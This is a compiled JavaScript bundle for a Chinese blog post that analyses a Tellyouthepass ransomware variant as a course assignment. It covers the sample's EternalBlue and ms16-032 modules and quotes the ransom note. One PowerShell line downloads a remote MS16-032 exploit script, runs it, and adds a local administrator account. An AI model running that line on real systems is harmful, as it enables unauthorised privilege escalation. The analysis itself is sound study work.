import{_ as p}from"./ValaxyMain.vue_vue_type_style_index_0_lang-fe952921.js";import{_ as y,p as d,c as h,w as l,o as _,a as t,b as s,d as a,r as o,e as f}from"./app-a51598bf.js";import"./YunFooter.vue_vue_type_script_setup_true_lang-9cc900c2.js";import"./YunCard.vue_vue_type_script_setup_true_lang-fac3e250.js";import"./YunPageHeader.vue_vue_type_script_setup_true_lang-e8684ee8.js";const u="/Ransomware_analysis/1-software.png",m="/Ransomware_analysis/2-ms16-032.png",A="/Ransomware_analysis/3-failed.png",C="/Ransomware_analysis/4-debug.png",b="/Ransomware_analysis/5-pay.png",D="/Ransomware_analysis/6-rsa.png",g="/Ransomware_analysis/7-rsa_pub.png",Et=JSON.parse('{"title":"Ransomware analysis","description":"","frontmatter":{"categories":"二进制","date":"2022-02-07T17:21:10.000Z","layout":"post","tags":null,"title":"Ransomware analysis"},"headers":[{"level":2,"title":"1、lantools_exp.exe---永恒之蓝","slug":"_1、lantools-exp-exe-永恒之蓝","link":"#_1、lantools-exp-exe-永恒之蓝","children":[]},{"level":2,"title":"2、awindows_privedge.exe---提权","slug":"_2、awindows-privedge-exe-提权","link":"#_2、awindows-privedge-exe-提权","children":[]},{"level":2,"title":"3、勒索模块---加密","slug":"_3、勒索模块-加密","link":"#_3、勒索模块-加密","children":[]},{"level":2,"title":"参考文章","slug":"参考文章","link":"#参考文章","children":[]}],"relativePath":"pages/posts/Ransomware analysis.md","path":"/home/runner/work/1ss4kIT.github.io/1ss4kIT.github.io/pages/posts/Ransomware analysis.md","lastUpdated":1690730773000}'),i=JSON.parse('{"title":"Ransomware analysis","description":"","frontmatter":{"categories":"二进制","date":"2022-02-07T17:21:10.000Z","layout":"post","tags":null,"title":"Ransomware analysis"},"headers":[{"level":2,"title":"1、lantools_exp.exe---永恒之蓝","slug":"_1、lantools-exp-exe-永恒之蓝","link":"#_1、lantools-exp-exe-永恒之蓝","children":[]},{"level":2,"title":"2、awindows_privedge.exe---提权","slug":"_2、awindows-privedge-exe-提权","link":"#_2、awindows-privedge-exe-提权","children":[]},{"level":2,"title":"3、勒索模块---加密","slug":"_3、勒索模块-加密","link":"#_3、勒索模块-加密","children":[]},{"level":2,"title":"参考文章","slug":"参考文章","link":"#参考文章","children":[]}],"relativePath":"pages/posts/Ransomware analysis.md","path":"/home/runner/work/1ss4kIT.github.io/1ss4kIT.github.io/pages/posts/Ransomware analysis.md","lastUpdated":1690730773000}'),w={name:"pages/posts/Ransomware analysis.md",data(){return{data:i,frontmatter:i.frontmatter,$frontmatter:i.frontmatter}},setup(){d("pageData",i)}},v=t("p",null,[s("对某勒索软件进行分析，题目来源于"),t("code",null,"恶意软件"),s("课程的大作业。")],-1),E=t("p",null,"包含两个文件，名称分别如下",-1),F=t("div",{class:"language-python"},[t("span",{class:"copy"}),t("pre",{class:"shiki material-theme-palenight"},[t("code",null,[t("span",{class:"line"},[t("span",{style:{color:"#A6ACCD"}},"0a0d5d2d3c663c54a92cb11f7102eb39")]),s(`
`),t("span",{class:"line"},[t("span",{style:{color:"#A6ACCD"}},"6b9dbf198890b690358fcfc943167373")])])])],-1),k=t("p",null,"搜索发现其是Tellyouthepass勒索病毒的变种。",-1),x=t("code",null,"ms16-032内核提权漏洞利用模块",-1),R=t("code",null,"永恒之蓝内网扩散模块",-1),S=t("p",null,"但是之后就没再找到更详细的分析文章了。",-1),T=t("p",null,[s("解压缩，得到如下三个文件。awindows_privedge.exe会启动剩下的两个文件。 "),t("img",{src:u,alt:"1-software"})],-1),$={id:"_1、lantools-exp-exe-永恒之蓝",tabindex:"-1"},I=t("p",null,"参考文章[1]给出如下分析",-1),M=t("div",{class:"language-python"},[t("span",{class:"copy"}),t("pre",{class:"shiki material-theme-palenight"},[t("code",null,[t("span",{class:"line"},[t("span",{style:{color:"#A6ACCD"}},"该模块为针对smb进行攻击利用的工具集，其中包含了对smb服务的远程探测，smb登录psexec命令执行，端口扫描，http服务搭建等功能，同时该工具包含了永恒之蓝漏洞高危漏洞（MS17"),t("span",{style:{color:"#89DDFF"}},"-"),t("span",{style:{color:"#F78C6C"}},"010"),t("span",{style:{color:"#A6ACCD"}},"）的攻击利用，该模块运行后将进行内网蠕虫扩散debug"),t("span",{style:{color:"#89DDFF"}},"."),t("span",{style:{color:"#F07178"}},"exe病毒模块"),t("span",{style:{color:"#A6ACCD"}},"。")])])])],-1),N={id:"_2、awindows-privedge-exe-提权",tabindex:"-1"},P=t("p",null,"查看其导入表，发现有和privilege和token相关的函数。",-1),B=t("p",null,"查看硬编码的字符串，发现和ms16-032提权漏洞相关的内容。攻击者的目的是以system权限执行其他攻击模块。",-1),V=t("p",null,[t("img",{src:m,alt:"2-ms16-032"})],-1),W=t("p",null,"随后尝试在windows7上进行ms16-032提权漏洞复现。",-1),X=t("p",null,"首先查看XX用户的信息",-1),O=t("div",{class:"language-python"},[t("span",{class:"copy"}),t("pre",{class:"shiki material-theme-palenight"},[t("code",null,[t("span",{class:"line"},[t("span",{style:{color:"#A6ACCD"}},"net user XX")])])])],-1),L=t("p",null,"打开powershell执行如下语句",-1),Y=t("div",{class:"language-python"},[t("span",{class:"copy"}),t("pre",{class:"shiki material-theme-palenight"},[t("code",null,[t("span",{class:"line"},[t("span",{style:{color:"#A6ACCD"}},"powershell "),t("span",{style:{color:"#89DDFF"}},"-"),t("span",{style:{color:"#A6ACCD"}},"nop "),t("span",{style:{color:"#89DDFF"}},"-"),t("span",{style:{color:"#82AAFF"}},"exec"),t("span",{style:{color:"#A6ACCD"}}," bypass "),t("span",{style:{color:"#89DDFF"}},"-"),t("span",{style:{color:"#A6ACCD"}},"c "),t("span",{style:{color:"#89DDFF"}},'"'),t("span",{style:{color:"#C3E88D"}},"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c net localgroup administrators px /add'"),t("span",{style:{color:"#89DDFF"}},'"')])])])],-1),H=t("p",null,"出现如下错误，url解析错误，原来的网址已经无法访问了。",-1),J=t("p",null,[t("img",{src:A,alt:"3-failed"})],-1),U=t("p",null,"此外没找到对漏洞详细的分析文章，都是一条命令直接利用。就先不看这里啦～",-1),Z={id:"_3、勒索模块-加密",tabindex:"-1"},j=t("p",null,"debug.exe解压缩，得到windbug.exe和debug.bat。",-1),K=t("p",null,[t("img",{src:C,alt:"4-debug"})],-1),q=t("p",null,[s("debug.bat的内容为："),t("code",null,"start C:\\Windows\\windebug.exe"),s("，而windebug.exe是主要的勒索模块。")],-1),z=t("p",null,"ida打开windbug.exe，查看字符串，推断其是由go语言所编写的。",-1),G=t("p",null,"在sub_500CD0()函数中找到了让受害者支付比特币的字符串",-1),Q=t("p",null,[t("img",{src:b,alt:"5-pay"})],-1),tt=t("div",{class:"language-python"},[t("span",{class:"copy"}),t("pre",{class:"shiki material-theme-palenight"},[t("code",null,[t("span",{class:"line"},[t("span",{style:{color:"#89DDFF","font-style":"italic"}},'"'),t("span",{style:{color:"#676E95","font-style":"italic"}},"<html>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<head>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<title>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"Recovery your files."),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"</title>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<style type="),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},'\\"'),t("span",{style:{color:"#676E95","font-style":"italic"}},"text/css"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},'\\"'),t("span",{style:{color:"#676E95","font-style":"italic"}},">"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n\\t"),t("span",{style:{color:"#676E95","font-style":"italic"}},".main {height:auto; width:100%;word-wrap:break-word}"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"</style>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"</head>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<body>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<font color=#8B0000>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<b>I am so sorry ! All your files have been encryptd by RSA-1024 and AES-256 due to a computer security problems.</b></br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<b>If you think your data is very important .The only way to decrypt your file is to buy my decrytion tool .</b></br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<b>else you can delete your encrypted data or reinstall your system.</b></br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"</br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<h2>Your personid :</h2>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<div class="),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},'\\"'),t("span",{style:{color:"#676E95","font-style":"italic"}},"main"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},'\\"'),t("span",{style:{color:"#676E95","font-style":"italic"}},">"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<b>ITSSHOWKEY</b></div></br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"</br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"</br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<h2>Decrytion do as follows:</h2>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<b>1. if you not own bitcoin,you can buy it online on some websites. like https://localbitcoins.net/ or https://www.coinbase.com/  .</b></br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<b>2. send ITSBTC btc to my wallet address ITSADDR.</b></br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<b>3. send your btc transfer screenshots and your persionid to my email ITSEMAIL . i will send you decrytion tool.</b></br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"</br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"</br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<h2>Tips:</h2>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<b>1.don't rename your file </b></br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<b>2.you can try some software to decrytion . but finally you will kown it's vain . </b></br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<b>3.if any way can't to contact to me .you can try send me bitcoin and paste your email in the transfer information. i will contact you and send you decrytion tools.</b></br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"</br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"</br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<b>Anything you want to help . please send mail to my email ITSEMAIL.</b></br>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<b>Have a nice day . </b>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"</font>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"<body>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#676E95","font-style":"italic"}},"</html>"),t("span",{style:{color:"#A6ACCD","font-style":"italic"}},"\\n"),t("span",{style:{color:"#89DDFF","font-style":"italic"}},'"'),t("span",{style:{color:"#89DDFF"}},",")])])])],-1),st=t("p",null,"下文描述一些加密方式。",-1),lt=t("p",null,"还是关注勒索模块，检查字符串发现有如下的字符串",-1),et=t("div",{class:"language-python"},[t("span",{class:"copy"}),t("pre",{class:"shiki material-theme-palenight"},[t("code",null,[t("span",{class:"line"},[t("span",{style:{color:"#A6ACCD"}},"rsa"),t("span",{style:{color:"#89DDFF"}},"."),t("span",{style:{color:"#F07178"}},"PrecomputedValues")]),s(`
`),t("span",{class:"line"},[t("span",{style:{color:"#A6ACCD"}},"crypto"),t("span",{style:{color:"#89DDFF"}},"/"),t("span",{style:{color:"#A6ACCD"}},"aes")]),s(`
`),t("span",{class:"line"},[t("span",{style:{color:"#A6ACCD"}},"crypto"),t("span",{style:{color:"#89DDFF"}},"/"),t("span",{style:{color:"#A6ACCD"}},"rsa")])])])],-1),ot=t("p",null,"并且根据之前的文字提示",-1),nt=t("div",{class:"language-python"},[t("span",{class:"copy"}),t("pre",{class:"shiki material-theme-palenight"},[t("code",null,[t("span",{class:"line"},[t("span",{style:{color:"#A6ACCD"}},"All your files have been encryptd by RSA"),t("span",{style:{color:"#89DDFF"}},"-"),t("span",{style:{color:"#F78C6C"}},"1024"),t("span",{style:{color:"#A6ACCD"}}," "),t("span",{style:{color:"#89DDFF"}},"and"),t("span",{style:{color:"#A6ACCD"}}," AES"),t("span",{style:{color:"#89DDFF"}},"-"),t("span",{style:{color:"#F78C6C"}},"256"),t("span",{style:{color:"#A6ACCD"}}," due to a computer security problems"),t("span",{style:{color:"#89DDFF"}},".")])])])],-1),at=t("p",null,"推测由AES和RSA加密。",-1),it=t("p",null,"在 sub_503530 中，恶意代码在用户机器上为用户生成 RSA-1024 公私钥pk_user/sk_user，保存在两个全局变量 dword_5F7F50、dword_5F7F54 中。",-1),ct=t("p",null,[t("img",{src:D,alt:"6-rsa"})],-1),rt=t("p",null,"RSA2048公钥如下：",-1),pt=t("p",null,[t("img",{src:g,alt:"7-rsa_pub"})],-1),yt=t("p",null,"更加详细的加密方式可查阅参考文章[1]。",-1),dt=t("p",null,"恶意软件整体的流程可查阅参考文章[2]，包括退出当前程序，扫描目录，设置白名单等。",-1),ht=t("p",null,"自己目前水平还是太低，没有找到更加详细的分析文章，同时也不具备独立分析的能力，只能理解到这个程度了。还是需要努力学习哇！！",-1),_t={id:"参考文章",tabindex:"-1"};function ft(e,ut,mt,At,c,Ct){const n=f,r=p;return _(),h(r,{frontmatter:c.frontmatter,data:c.data},{"main-content-md":l(()=>[v,E,F,k,t("p",null,[s("腾讯安全在"),a(n,{href:"http://www.hackdig.com/07/hack-103589.htm",target:"_blank",rel:"noreferrer"},{default:l(()=>[s("此文章")]),_:1}),s("中说，攻击者利用压缩工具打包exe的方式，将"),x,s("、"),R,s("集成到勒索攻击包中，以实现内网蠕虫式病毒传播。")]),S,T,t("h2",$,[s("1、lantools_exp.exe---永恒之蓝 "),a(n,{class:"header-anchor",href:"#_1、lantools-exp-exe-永恒之蓝","aria-hidden":"true"},{default:l(()=>[s("#")]),_:1})]),I,M,t("h2",N,[s("2、awindows_privedge.exe---提权 "),a(n,{class:"header-anchor",href:"#_2、awindows-privedge-exe-提权","aria-hidden":"true"},{default:l(()=>[s("#")]),_:1})]),P,B,V,W,X,O,L,Y,H,J,t("p",null,[s("参考教程："),a(n,{href:"https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html",target:"_blank",rel:"noreferrer"},{default:l(()=>[s("https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html")]),_:1})]),U,t("h2",Z,[s("3、勒索模块---加密 "),a(n,{class:"header-anchor",href:"#_3、勒索模块-加密","aria-hidden":"true"},{default:l(()=>[s("#")]),_:1})]),j,K,q,z,G,Q,tt,st,lt,et,ot,nt,at,it,ct,rt,pt,yt,dt,ht,t("h2",_t,[s("参考文章 "),a(n,{class:"header-anchor",href:"#参考文章","aria-hidden":"true"},{default:l(()=>[s("#")]),_:1})]),t("p",null,[s("【1】"),a(n,{href:"http://www.hackdig.com/07/hack-103589.htm",target:"_blank",rel:"noreferrer"},{default:l(()=>[s("Tellyouthepass勒索病毒利用永恒之蓝漏洞来袭，已有企业受害")]),_:1})]),t("p",null,[s("【2】["),a(n,{href:"https://bbs.360.cn/thread-15831380-1-1.html",target:"_blank",rel:"noreferrer"},{default:l(()=>[s("TellYouThePass勒索病毒样本分析")]),_:1}),s("]("),a(n,{href:"https://bbs.360.cn/thread-15831380-1-1.html",target:"_blank",rel:"noreferrer"},{default:l(()=>[s("https://bbs.360.cn/thread-15831380-1-1.html")]),_:1}),s(")")])]),"main-header":l(()=>[o(e.$slots,"main-header")]),"main-header-after":l(()=>[o(e.$slots,"main-header-after")]),"main-nav":l(()=>[o(e.$slots,"main-nav")]),"main-content":l(()=>[o(e.$slots,"main-content")]),"main-content-after":l(()=>[o(e.$slots,"main-content-after")]),"main-nav-before":l(()=>[o(e.$slots,"main-nav-before")]),"main-nav-after":l(()=>[o(e.$slots,"main-nav-after")]),comment:l(()=>[o(e.$slots,"comment")]),footer:l(()=>[o(e.$slots,"footer")]),aside:l(()=>[o(e.$slots,"aside")]),"aside-custom":l(()=>[o(e.$slots,"aside-custom")]),default:l(()=>[o(e.$slots,"default")]),_:3},8,["frontmatter","data"])}const Ft=y(w,[["render",ft]]);export{Et as __pageData,Ft as default};
